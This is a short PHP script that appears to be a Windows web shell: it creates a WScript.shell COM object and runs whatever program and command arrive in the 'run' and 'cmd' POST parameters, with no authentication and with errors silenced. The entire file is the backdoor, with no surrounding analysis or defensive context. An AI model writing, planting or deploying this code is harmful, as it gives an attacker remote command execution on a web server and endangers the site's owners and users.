<?php
$shell = new COM("WScript.shell");
if(!empty($_POST['run'])) {
	$run = $_POST['run'];
	$cmd = $_POST['cmd'];
	@$shell->ShellExecute($run,'/c '.$cmd);
}
	
?>